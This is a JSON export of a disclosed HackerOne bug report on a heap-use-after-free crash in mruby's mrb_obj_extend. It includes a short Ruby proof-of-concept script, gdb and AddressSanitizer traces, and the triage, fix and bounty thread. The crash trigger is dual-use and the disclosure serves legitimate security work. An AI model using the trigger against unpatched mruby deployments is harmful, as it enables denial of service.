{"id":197694,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTc2OTQ=","url":"https://hackerone.com/reports/197694","title":"SIGSEGV - mrb_obj_extend - line:413","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-01-12T01:07:55.248Z","submitted_at":"2017-01-12T01:07:55.248Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ston3","url":"/ston3","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-03-09T01:26:59.033Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-02-07T01:26:54.048Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"PoC:\n-------------------\n\nThe following code triggers the bug (attached as test_mrb_obj_extend_413.rb):\n\n\tmodule Test end\n\tdef method_missing(s)extend(Test)end\n\tdef set(v)a.set(0)end\n\tset(0)\n\nMirb - Debug:\n-------------------\n\n\t(gdb) r test_mrb_obj_extend_413.rb \n\tThe program being debugged has been started already.\n\tStart it from the beginning? (y or n) y\n\tStarting program: /home/x/Desktop/research/test_2/mruby/bin/mirb test_mrb_obj_extend_413.rb\n\tmirb - Embeddable Interactive Ruby Shell\n\n\t =\u003e nil\n\t =\u003e :method_missing\n\t =\u003e :set\n\n\tProgram received signal SIGSEGV, Segmentation fault.\n\t0x0000000000418e9b in mrb_obj_extend (mrb=0x6ad010, argc=0, argv=0x7529f0, obj=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:413\n\t413\t    mrb_funcall(mrb, argv[argc], \"extended\", 1, obj);\n\t(gdb) info reg\n\trax            0x7529f0\t7678448\n\trbx            0x0\t0\n\trcx            0x3\t3\n\trdx            0x0\t0\n\trsi            0x6ad1b0\t7000496\n\trdi            0x6ad010\t7000080\n\trbp            0x7fffffffc470\t0x7fffffffc470\n\trsp            0x7fffffffc420\t0x7fffffffc420\n\tr8             0x1\t1\n\tr9             0x6b01b0\t7012784\n\tr10            0x7fff0000000a\t140733193388042\n\tr11            0x7ffff7895770\t140737346361200\n\tr12            0x401ca0\t4201632\n\tr13            0x7fffffffe040\t140737488347200\n\tr14            0x0\t0\n\tr15            0x0\t0\n\trip            0x418e9b\t0x418e9b \u003cmrb_obj_extend+241\u003e\n\teflags         0x10206\t[ PF IF RF ]\n\tcs             0x33\t51\n\tss             0x2b\t43\n\tds             0x0\t0\n\tes             0x0\t0\n\tfs             0x0\t0\n\tgs             0x0\t0\n\t(gdb) l\n\t408\t  for (i = 0; i \u003c argc; i++) {\n\t409\t    mrb_check_type(mrb, argv[i], MRB_TT_MODULE);\n\t410\t  }\n\t411\t  while (argc--) {\n\t412\t    mrb_funcall(mrb, argv[argc], \"extend_object\", 1, obj);\n\t413\t    mrb_funcall(mrb, argv[argc], \"extended\", 1, obj);\n\t414\t  }\n\t415\t  return obj;\n\t416\t}\n\t417\t\n\n\t\nBacktrace:\n-------------------\n\n\t(gdb) bt\n\t#0  0x0000000000418e9b in mrb_obj_extend (mrb=0x6ad010, argc=0, argv=0x7529f0, obj=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:413\n\t#1  0x0000000000418f43 in mrb_obj_extend_m (mrb=0x6ad010, self=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:450\n\t#2  0x0000000000426f65 in mrb_vm_exec (mrb=0x6ad010, proc=0x6b00f0, pc=0x71d50c) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1174\n\t#3  0x000000000042541b in mrb_vm_run (mrb=0x6ad010, proc=0x6b0000, self=..., stack_keep=1) at /home/x/Desktop/research/test_2/mruby/src/vm.c:772\n\t#4  0x0000000000402b90 in main (argc=2, argv=0x7fffffffe048) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549\n\nClang - mirb\n-------------------\n\n\tx@x:~/Desktop/research/test_2/mruby-engine/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../../clang/mruby/bin/mirb test_mrb_obj_extend_413.rb \n\tmirb - Embeddable Interactive Ruby Shell\n\n\t =\u003e nil\n\t =\u003e :method_missing\n\t =\u003e :set\n\t=================================================================\n\t==2583==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d00001e850 at pc 0x000000595ddc bp 0x7fffbc91f530 sp 0x7fffbc91f528\n\tREAD of size 8 at 0x61d00001e850 thread T0\n\t\t#0 0x595ddb in mrb_obj_extend /home/x/Desktop/research/clang/mruby/src/kernel.c:413:5\n\t\t#1 0x58d36f in mrb_obj_extend_m /home/x/Desktop/research/clang/mruby/src/kernel.c:450:10\n\t\t#2 0x5df4e8 in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1174:18\n\t\t#3 0x5d2fbb in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10\n\t\t#4 0x4f3ee8 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18\n\t\t#5 0x7ff991aaeec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n\t\t#6 0x41a585 in _start (/home/x/Desktop/research/clang/mruby/bin/mirb+0x41a585)\n\t\nMruby - Debug:\n-------------------\n\t\n\t(gdb) r test_mrb_obj_extend_413.rb \n\tThe program being debugged has been started already.\n\tStart it from the beginning? (y or n) y\n\tStarting program: /home/x/Desktop/research/test_2/mruby/bin/mruby test_mrb_obj_extend_413.rb\n\n\tProgram received signal SIGSEGV, Segmentation fault.\n\t0x0000000000418765 in mrb_obj_extend (mrb=0x6ad010, argc=0, argv=0x759b10, obj=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:413\n\t413\t    mrb_funcall(mrb, argv[argc], \"extended\", 1, obj);\n\t(gdb) info reg\n\trax            0x759b10\t7707408\n\trbx            0x6bfe40\t7077440\n\trcx            0x4\t4\n\trdx            0x0\t0\n\trsi            0x6ad1b0\t7000496\n\trdi            0x6ad010\t7000080\n\trbp            0x7fffffffd5a0\t0x7fffffffd5a0\n\trsp            0x7fffffffd550\t0x7fffffffd550\n\tr8             0x1\t1\n\tr9             0x0\t0\n\tr10            0x0\t0\n\tr11            0x7ffff7895770\t140737346361200\n\tr12            0x401b20\t4201248\n\tr13            0x7fffffffe040\t140737488347200\n\tr14            0x0\t0\n\tr15            0x0\t0\n\trip            0x418765\t0x418765 \u003cmrb_obj_extend+241\u003e\n\teflags         0x10202\t[ IF RF ]\n\tcs             0x33\t51\n\tss             0x2b\t43\n\tds             0x0\t0\n\tes             0x0\t0\n\tfs             0x0\t0\n\tgs             0x0\t0\n\t(gdb) l\n\t408\t  for (i = 0; i \u003c argc; i++) {\n\t409\t    mrb_check_type(mrb, argv[i], MRB_TT_MODULE);\n\t410\t  }\n\t411\t  while (argc--) {\n\t412\t    mrb_funcall(mrb, argv[argc], \"extend_object\", 1, obj);\n\t413\t    mrb_funcall(mrb, argv[argc], \"extended\", 1, obj);\n\t414\t  }\n\t415\t  return obj;\n\t416\t}\n\t417\n\nBacktrace:\n-------------------\n\n\t(gdb) bt\n\t#0  0x0000000000418765 in mrb_obj_extend (mrb=0x6ad010, argc=0, argv=0x759b10, obj=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:413\n\t#1  0x000000000041880d in mrb_obj_extend_m (mrb=0x6ad010, self=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:450\n\t#2  0x0000000000424df2 in mrb_vm_exec (mrb=0x6ad010, proc=0x6b0120, pc=0x71b41c) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1174\n\t#3  0x00000000004232a8 in mrb_vm_run (mrb=0x6ad010, proc=0x6b01b0, self=..., stack_keep=0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:772\n\t#4  0x000000000042b2bc in mrb_top_run (mrb=0x6ad010, proc=0x6b01b0, self=..., stack_keep=0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:2490\n\t#5  0x0000000000445cca in mrb_load_exec (mrb=0x6ad010, p=0x709480, c=0x7080b0) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n\t#6  0x0000000000445d60 in mrb_load_file_cxt (mrb=0x6ad010, f=0x709080, c=0x7080b0) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-compiler/core/parse.y:5764\n\t#7  0x00000000004024f8 in main (argc=2, argv=0x7fffffffe048) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n\nClang - mruby\n-------------------\n\n\tx@x:~/Desktop/research/test_2/mruby-engine/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../../clang/mruby/bin/mruby test_mrb_obj_extend_413.rb \n\t=================================================================\n\t==2585==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d00001e850 at pc 0x0000005947ec bp 0x7fff9d072750 sp 0x7fff9d072748\n\tREAD of size 8 at 0x61d00001e850 thread T0\n\t\t#0 0x5947eb in mrb_obj_extend /home/x/Desktop/research/clang/mruby/src/kernel.c:413:5\n\t\t#1 0x58bd7f in mrb_obj_extend_m /home/x/Desktop/research/clang/mruby/src/kernel.c:450:10\n\t\t#2 0x5d8fb8 in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1174:18\n\t\t#3 0x5cca8b in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10\n\t\t#4 0x5ffa48 in mrb_top_run /home/x/Desktop/research/clang/mruby/src/vm.c:2490:12\n\t\t#5 0x66fe49 in mrb_load_exec /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5755:7\n\t\t#6 0x670965 in mrb_load_file_cxt /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5764:10\n\t\t#7 0x4f3ad5 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11\n\t\t#8 0x7f84000caec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n\t\t#9 0x41a4e5 in _start (/home/x/Desktop/research/clang/mruby/bin/mruby+0x41a4e5)\n\nImpact\n-------------------\n\nAs far as I can see, it is not exploitable. But it can cause DoS.","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":151694,"file_name":"test_mrb_obj_extend_413.rb","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/151/694/e50eb5140addede79eecddbcb665e28488147eab/test_mrb_obj_extend_413.rb?response-content-disposition=attachment%3B%20filename%3D%22test_mrb_obj_extend_413.rb%22%3B%20filename%2A%3DUTF-8%27%27test_mrb_obj_extend_413.rb\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ33OZT5PP%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T135951Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDh91HQqgz8mt29LtWDknUFVa4Bu86qeWnq8qOBQ4%2B8YAIhAJicmQmdRKuH%2BFKshKD5HTFqxieLS9bLt%2Bm8ixoUQIW3KoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxjBiCZo4VtYu6s0mkq1wMS3NiFshNMAkLirys6UqWqG8DtyLSnjp2Jjq3FOYZ3z5QPGI3pyApw22mHN9%2FCuJJ7nvZBlTnqVZioeymrRwRkh3Ep2Grp7bfy17tsucRab4%2Fwcov%2FuB%2BH%2FlOKLA0dPOLvtzKyIZukVE4weTfh0vOmJyKq0MNT872S%2BEJQLaNHxuaApYj89CoiKQ8iIYPil%2Fer515Tq61zraK163aXC6Wy%2Bh9wZG9n9nO%2BF1HjHbOKQzNHLtEPDs0LaRFl2yyG012UrzxbWRh3SKf%2BZrF4YZHuHGoHHIILeGK7ULsTEUwPzgUchRw1iPy0mN9FOZAmWbrDJGsit0hVq3pp5X2hPUG4sFE8%2F6L9i0WnB%2B10Vp3U%2Frt684dQjLB%2BN9XMGfru4gI4tqqTswEvdVKIEl24vu1y1GF4NHtB52g2uU0a32AMPT4CyiEmO89SmREN7kkSkG506ZPZM6WpVb3X01QplYYRrO8hlLoLzsG90yPauXyc9z1g3ctobA3rwzP0%2BqnbTFOPOLdg%2Fez87Kn7dOH%2FJ5gT4VcfvDJKUt7spf4PMSNNs%2B45MGrcVDhtPaqpVkGpjTY2Qumd8jnWYmah%2BcSUkcSfYxIQ8VjPNpkeGcsLaLhPLK%2BhKhc6iXUw9vqQiwY6pAEkpudJjvKBj1n%2B2NK2uzTbiu0zjrqvjRC7B2s5rDWkChSlyjdb5Gs7Y4xGynRFg2owPJvc66mub6OLgiEzz%2BMOYFcjvSwIHpDD0Esy3kPtVCPpCMvheYuZFtLkLN%2FOortUj7F7jaVVdakEud32Wsg33glLfI0B%2F55RSf0DkRble%2FhL0EB4lzVO1F1OLS0MQQYssZKljr4UYXvI8G5j0rwW6dHIGQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ebf231d011d8c0cd6470d9c99aac55897157d83a36db1f143476ff590c4aa778","file_size":84,"type":"text/plain"}],"allow_singular_disclosure_at":"2017-03-09T01:26:54.100Z","allow_singular_disclosure_after":-144937977.59478763,"singular_disclosure_allowed":true,"vote_count":8,"voters":["icanthack","mpz","eveeez","apapedulimu","a5tronaut","spetr0x","oldusername","jeffakiller123"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1415127,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!","automated_response":true,"created_at":"2017-01-12T01:07:55.447Z","updated_at":"2017-01-12T01:07:55.447Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1454706,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the issue and opened a report upstream: https://github.com/mruby/mruby/issues/3419","automated_response":false,"created_at":"2017-01-31T19:14:39.227Z","updated_at":"2017-01-31T19:14:39.227Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1465160,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. This issue was recently fixed upstream in https://github.com/mruby/mruby/commit/bf4e79cc62af809138bc7db7e54ece67080b5fa8\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.","automated_response":false,"created_at":"2017-02-06T14:50:29.727Z","updated_at":"2017-02-06T14:50:29.727Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ston3","url":"/ston3"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1467354,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of the Mruby Project!","automated_response":false,"created_at":"2017-02-07T01:26:47.721Z","updated_at":"2017-02-07T01:26:47.721Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"100.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"ston3","url":"/ston3"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1467357,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-02-07T01:26:54.070Z","updated_at":"2017-02-07T01:26:54.070Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1467912,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for bounty.","automated_response":false,"created_at":"2017-02-07T08:52:41.554Z","updated_at":"2017-02-07T08:52:41.554Z","actor":{"username":"ston3","cleared":false,"url":"/ston3","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1528912,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-03-09T01:26:59.052Z","updated_at":"2017-03-09T01:26:59.052Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}